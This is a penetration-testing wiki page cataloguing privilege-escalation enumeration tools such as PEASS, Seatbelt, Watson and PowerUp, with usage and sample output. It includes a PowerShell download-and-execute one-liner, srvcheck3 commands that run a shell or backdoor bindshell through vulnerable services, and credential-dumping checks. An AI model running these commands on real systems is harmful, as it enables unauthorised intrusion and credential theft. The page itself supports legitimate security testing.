---
description: >-
  Tools which will make your life easier in a search for privilege escalation
  paths
---

# Automated tools

## Summary

| Name | Unix | Windows | Solaris | Mac |
| :--- | :--- | :--- | :--- | :--- |
| PEASS | sh | exe and bat | - | sh |
| BeRoot | py | exe | - | py |
| Unix privesc check | sh | - | - | - |
| Windows Exploit Suggester | - | systeminfo | - | - |
| Linux Exploit Suggester | perl | - | - | - |
| Solaris Exploit Suggester | - | - | showrev | - |
| LinEnum | sh | - | - | - |
| Nishang | - | PS | - | - |
| SharpUp | - | exe | - | - |
| Seatbelt | - | exe | - | - |
| JAWS | - | PS | - | - |
| Watson | - | exe | - | - |
| PowerUp | - | PS | - | - |
| srvcheck3 | - | exe | - | - |

## PEASS

PEASS - Privilege Escalation Awesome Scripts SUITE

Link: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/README.md](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/README.md)

These tools search for possible **local privilege escalation paths** that you could exploit and print them to you **with nice colors** so you can recognize the misconfigurations easily.

* Check the **Local Windows Privilege Escalation checklist** from [**book.hacktricks.xyz**](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)
* [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) **- Windows local Privilege Escalation Awesome Script \(C\#.exe and .bat\)**
* Check the **Local Linux Privilege Escalation checklist** from [**book.hacktricks.xyz**](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)
* [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) **- Linux local Privilege Escalation Awesome Script \(.sh\)**

## BeRoot

BeRoot Project is a post exploitation tool to check common misconfigurations to find a way to escalate our privilege.  
 It has been added to the [pupy](https://github.com/n1nj4sec/pupy/) project as a post exploitation module \(so it will be executed in memory without touching the disk\).

Link: [https://github.com/AlessandroZ/BeRoot](https://github.com/AlessandroZ/BeRoot)

Windows pre compiled versions: 

{% embed url="https://github.com/AlessandroZ/BeRoot/releases" %}

Linux:

{% embed url="https://github.com/AlessandroZ/BeRoot/tree/master/Linux" %}

## Unix privesc check

Unix-privesc-checker is a script that runs on Unix systems \(tested on Solaris 9, HPUX 11, Various Linuxes, FreeBSD 6.2\). It tries to find misconfigurations that could allow local unprivileged users to escalate privileges to other users or to access local apps \(e.g. databases\). 

Link: [https://github.com/pentestmonkey/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check) 

Usage: 

`$ ./unix-privesc-check > output.txt` 

## Windows-Exploit-Suggester

This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins. 

It requires the 'systeminfo' command output from a Windows host in order to compare that the Microsoft security bulletin database and determine the patch level of the host. 

**USAGE**:

update the database :

```text
$ ./windows-exploit-suggester.py --update 
[*] initiating... 
[*] successfully requested base url 
[*] scraped ms download url 
[+] writing to file 2014-06-06-mssb.xlsx 
[*] done 
```

feed it "systeminfo" input, and point it to the microsoft database 

`$ ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt` 

## Linux Exploit Suggester

When run without arguments, the script performs a 'uname -r' to grab the Linux operating system release version, and returns a list of possible exploits. Links to CVEs and applicable exploit POCs are included. Keep in mind that a patched/back-ported patch may fool this script. 

Usage: 

`$ ./linux-exploit-suggester.pl` 

## Solaris Exploit suggester

This tool reads the output of “showrev -p” on Solaris machines and outputs a list of exploits that you might want to try.  It currently focusses on local exploitation of Solaris 8 on SPARC, but other version of Solaris are partially supported. 

Link: 

[http://pentestmonkey.net/tools/audit/exploit-suggester](http://pentestmonkey.net/tools/audit/exploit-suggester) 

**Example Output**:

```text
$ head showrev.out 
Patch: 109618-01 Obsoletes:  Requires:  Incompatibles:  Packages: SUNWeuxwe, SUNWeuezt, SUNWeudlg, SUNWeudda 
Patch: 109889-01 Obsoletes: 109353-04 Requires:  Incompatibles:  Packages: SUNWkvmx, SUNWkvm, SUNWmdb, SUNWhea, SUNWpstl, SUNWpstlx 
Patch: 110369-05 Obsoletes: 110709-02 Requires:  Incompatibles:  Packages: SUNWkvmx, SUNWcarx, SUNWcsr 
```

**Running**: 

```text
$ ./exploit-suggestions.pl 8 sparc showrev.out 
exploit-suggester v0.1 ( http://pentestmonkey.net/tools/exploit-suggester ) 
 ------------------------------------------------------------- 
|                     Runtime options                         | 
 ------------------------------------------------------------- 
Solaris version: ................ 8 
Architecture: ................... sparc 
Patch file: ..................... showrev.out 
Exploit database: ............... sploitdb.txt 
Don't list sploits rated as ..... N/A - Exclude no ratings 
List only sploits rated as ...... N/A - List any rating 
List only local sploits ......... N/A - Show both 

 ------------------------------------------------------------- 
|                   Suggested Exploits                        | 
 ------------------------------------------------------------- 
Description:          'at' Arbitrary File Deletion 
Remote:               0 
Exploit Rating:       1 (Sploit normally works) 
Patch installed:      108875-10 
Min vulnerable patch: 108875-00 
Max vulnerable patch: 108875-12 
Exploit Link:         http://www.securityfocus.com/data/vulnerabilities/exploits/isec-solaris-at-rm.c 
Exploit Link:         http://www.securityfocus.com/data/vulnerabilities/exploits/solaris-at.c 
Info Link:            http://securityfocus.com/bid
```

## LinEnum

Link: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

Scripted Local Linux Enumeration & Privilege Escalation Checks

version 0.982

* Example: `./LinEnum.sh -s -k keyword -r report -e /tmp/ -t`

OPTIONS:

* -k Enter keyword
* -e Enter export location
* -t Include thorough \(lengthy\) tests
* -s Supply current user password to check sudo perms \(INSECURE\)
* -r Enter report name
* -h Displays this help text

Running with no options = limited scans/no output file

## Nishang

Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.

**Link**: [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang) 

Also installed by default on Kali: 

`root@kali:~# ls -l /usr/share/nishang/` 

Escalation scripts:

* [Enable-DuplicateToken](https://github.com/samratashok/nishang/blob/master/Escalation/Enable-DuplicateToken.ps1) – When SYSTEM privileges are required. 
* [Remove-Update](https://github.com/samratashok/nishang/blob/master/Escalation/Remove-Update.ps1) – Introduce vulnerabilities by removing patches. 
* [Invoke-PsUACme](https://github.com/samratashok/nishang/blob/master/Escalation/Invoke-PsUACme.ps1) – Bypass UAC. 

## SharpUp

SharpUp is a C\# port of various PowerUp functionality. Currently, only the most common checks have been ported; no weaponization functions have yet been implemented. 

**Link**: [https://github.com/GhostPack/SharpUp](https://github.com/GhostPack/SharpUp) 

**Usage:**

```text
C:\Temp>SharpUp.exe 
=== SharpUp: Running Privilege Escalation Checks === 
 
=== Modifiable Services === 
Name             : VulnSvc 
DisplayName      : VulnSvc 
Description      : 
State            : Stopped 
StartMode        : Auto 
PathName         : C:\Program Files\VulnSvc\VulnSvc.exe 

=== Modifiable Service Binaries === 
Name             : VulnSvc2 
DisplayName      : VulnSvc22 
Description      : 
State            : Stopped 
StartMode        : Auto 
PathName         : C:\VulnSvc2\VulnSvc2.exe 

=== AlwaysInstallElevated Registry Keys === 
 
=== Modifiable Folders in %PATH% === 
Modifable %PATH% Folder  : C:\Go\bin 

=== Modifiable Registry Autoruns === 

=== *Special* User Privileges === 

=== Unattended Install Files === 

=== McAfee Sitelist.xml Files === 

[*] Completed Privesc Checks in 11 seconds 
```

## Seatbelt

Seatbelt is a C\# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives. 

**Usage** 

`SeatBelt.exe` all will run ALL enumeration checks, can be combined with full. 

`SeatBelt.exe [CheckName]` full will prevent any filtering and will return complete results. 

`SeatBelt.exe [CheckName] [CheckName2] ...` will run one or more specified checks only \(case-sensitive naming!\) 

**SeatBelt.exe system collects the following system data**: 

```text
BasicOSInfo           -   Basic OS info (i.e. architecture, OS version, etc.) 
RebootSchedule        -   Reboot schedule (last 15 days) based on event IDs 12 and 13 
TokenGroupPrivs       -   Current process/token privileges (e.g. SeDebugPrivilege/etc.) 
UACSystemPolicies     -   UAC system policies via the registry 
PowerShellSettings    -   PowerShell versions and security settings 
AuditSettings         -   Audit settings via the registry 
WEFSettings           -   Windows Event Forwarding (WEF) settings via the registry 
LSASettings           -   LSA settings (including auth packages) 
UserEnvVariables      -   Current user environment variables 
SystemEnvVariables    -   Current system environment variables 
UserFolders           -   Folders in C:\Users\ 
NonstandardServices   -   Services with file info company names that don't contain 'Microsoft' 
InternetSettings      -   Internet settings including proxy configs 
LapsSettings          -   LAPS settings, if installed 
LocalGroupMembers     -   Members of local admins, RDP, and DCOM 
MappedDrives          -   Mapped drives 
RDPSessions           -   Current incoming RDP sessions 
WMIMappedDrives       -   Mapped drives via WMI 
NetworkShares         -   Network shares 
FirewallRules         -   Deny firewall rules, "full" dumps all 
AntiVirusWMI          -   Registered antivirus (via WMI) 
InterestingProcesses  -   "Interesting" processes- defensive products and admin tools 
RegistryAutoRuns      -   Registry autoruns 
RegistryAutoLogon     -   Registry autologon information 
DNSCache              -   DNS cache entries (via WMI) 
ARPTable              -   Lists the current ARP table and adapter information (equivalent to arp -a) 
AllTcpConnections     -   Lists current TCP connections and associated processes 
AllUdpConnections     -   Lists current UDP connections and associated processes 
NonstandardProcesses  -   Running processeswith file info company names that don't contain 'Microsoft' 
  *  If the user is in high integrity, the following additional actions are run: 
SysmonConfig          -   Sysmon configuration from the registry 
```

**SeatBelt.exe user collects the following user data:**

```text
SavedRDPConnections   -   Saved RDP connections 
TriageIE              -   Internet Explorer bookmarks and history (last 7 days) 
DumpVault             -   Dump saved credentials in Windows Vault (i.e. logins from Internet Explorer and Edge), from SharpWeb 
RecentRunCommands     -   Recent "run" commands 
PuttySessions         -   Interesting settings from any saved Putty configurations 
PuttySSHHostKeys      -   Saved putty SSH host keys 
CloudCreds            -   AWS/Google/Azure cloud credential files (SharpCloud) 
RecentFiles           -   Parsed "recent files" shortcuts (last 7 days) 
MasterKeys            -   List DPAPI master keys 
CredFiles             -   List Windows credential DPAPI blobs 
RDCManFiles           -   List Windows Remote Desktop Connection Manager settings files 
  *  If the user is in high integrity, this data is collected for ALL users instead of just the current user 
```

Non-default collection options:

```text
CurrentDomainGroups   -   The current user's local and domain groups 
Patches               -   Installed patches via WMI (takes a bit on some systems) 
LogonSessions         -   User logon session data 
KerberosTGTData       -   ALL TEH TGTZ! 
InterestingFiles      -   "Interesting" files matching various patterns in the user's folder 
IETabs                -   Open Internet Explorer tabs 
TriageChrome          -   Chrome bookmarks and history 
TriageFirefox         -   Firefox history (no bookmarks) 
RecycleBin            -   Items in the Recycle Bin deleted in the last 30 days - only works from a user context! 
4624Events            -   4624 logon events from the security event log 
4648Events            -   4648 explicit logon events from the security event log 
KerberosTickets       -   List Kerberos tickets. If elevated, grouped by all logon sessions.
```

## JAWS

JAWS - Just Another Windows \(Enum\) Script 

JAWS is PowerShell script designed to help penetration testers \(and CTFers\) quickly identify potential privilege escalation vectors on Windows systems. It is written using PowerShell 2.0 so 'should' run on every Windows version since Windows 7. 

Link:  [GitHub - 411Hall/JAWS: JAWS - Just Another Windows \(Enum\) Script](https://github.com/411Hall/JAWS) 

**Usage:** 

Run from within CMD shell and write out to file. 

`CMD C:\temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt` 

Run from within CMD shell and write out to screen. 

`CMD C:\temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1` 

Run from within PS Shell and write out to file. 

`PS C:\temp> .\jaws-enum.ps1 -OutputFileName Jaws-Enum.txt` 

## Watson

Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities. 

Link:  [GitHub - rasta-mouse/Watson: Enumerate missing KBs and...](https://github.com/rasta-mouse/Watson) 

Usage:

```text
Usage: 
C:> Watson.exe 
__    __      _ 
/ / /\ \ \__ _| |_ ___  ___  _ __ 
\ \/  \/ / _` | __/ __|/ _ \| '_ \ 
  \  /\  / (_| | |_\__ \ (_) | | | | 
   \/  \/ \__,_|\__|___/\___/|_| |_| 

v2.0 

@_RastaMouse 

[*] OS Build Number: 14393 
[*] Enumerating installed KBs... 

[!] CVE-2019-0836 : VULNERABLE 
  [>] https://exploit-db.com/exploits/46718 
  [>] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/ 

[!] CVE-2019-0841 : VULNERABLE 
  [>] https://github.com/rogue-kdc/CVE-2019-0841 
  [>] https://rastamouse.me/tags/cve-2019-0841/ 

[!] CVE-2019-1064 : VULNERABLE 
  [>] https://www.rythmstick.net/posts/cve-2019-1064/ 

[!] CVE-2019-1130 : VULNERABLE 
  [>] https://github.com/S3cur3Th1sSh1t/SharpByeBear 

[!] CVE-2019-1253 : VULNERABLE 
  [>] https://github.com/padovah4ck/CVE-2019-1253 

[!] CVE-2019-1315 : VULNERABLE 
  [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html 

[*] Finished. Found 6 potential vulnerabilities. 
```



## PowerUp

Cheat sheet:  [https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf) 

**Download and run:**

`powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks` 

For all checks: 

`PS C:\Users\mssql-svc\appdata\local\temp> Invoke-AllChecks` 

## srvcheck3

Privilege escalation for Windows XP SP2 and before 

This can exploit vulnerable services. http://seclists.org/fulldisclosure/2006/Feb/231 

**Example**:  

`srvcheck3.exe -m upnphost -H 127.0.0.1 -c "cmd.exe /c c:\Inetpub\wwwroot\shell.exe"` 

View menu: 

`D:\Programación\srvcheck2>srvcheck`3`.exe -?` 

examples:

`Srvcheck3.exe -l` \(list local vulnerabilities\) 

`Srvcheck3.exe -l -H 192.168.1.1-192.168.1.255 -u domainuser -p domainpass` 

`Srvcheck3.exe -l -f hosts.txt -u DOMAINuser -p password` \(list remote vulnerabilities\)

`Srvcheck3.exe -m service -H host -c "cmd.exe /c md c:\PWNED"` 

`Srvcheck3.exe -m vulnservice -H 192.168.1.200 -u domainuser -p domainpass -r 192.168.1.1 21 backdoor.exe` \(exe cutes backdoor.exe bindshell\)



